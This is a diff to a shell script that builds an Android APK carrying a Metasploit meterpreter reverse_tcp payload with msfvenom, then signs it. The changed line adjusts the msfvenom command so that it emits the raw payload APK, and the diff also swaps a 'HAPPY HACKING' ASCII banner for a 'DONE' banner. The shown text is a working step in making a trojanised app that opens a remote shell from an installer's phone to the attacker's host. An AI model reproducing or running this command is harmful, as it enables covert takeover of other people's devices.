@@ -28,7 +28,7 @@ echo "
 
 # Create the reverse TCP APK using msfvenom
 echo "Generating APK with reverse TCP payload..."
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $DESKTOP_PATH/$APK_NAME
+msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=$LHOST R > $DESKTOP_PATH/$APK_NAME
 
 # Check if msfvenom was successful, if not then exit the script
 if [ $? -ne 0 ]; then
@@ -67,10 +67,10 @@ echo "Done. Signed and aligned APK is: $DESKTOP_PATH/$OUTPUT_APK_NAME"
 
 echo "
 
-██╗  ██╗ █████╗ ██████╗ ██████╗ ██╗   ██╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗ 
-██║  ██║██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝ 
-███████║███████║██████╔╝██████╔╝ ╚████╔╝     ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗
-██╔══██║██╔══██║██╔═══╝ ██╔═══╝   ╚██╔╝      ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║
-██║  ██║██║  ██║██║     ██║        ██║       ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝
-╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝        ╚═╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
+██████╗  ██████╗ ███╗   ██╗███████╗         
+██╔══██╗██╔═══██╗████╗  ██║██╔════╝         
+██║  ██║██║   ██║██╔██╗ ██║█████╗           
+██║  ██║██║   ██║██║╚██╗██║██╔══╝           
+██████╔╝╚██████╔╝██║ ╚████║███████╗██╗██╗██╗
+╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝╚═╝
 "
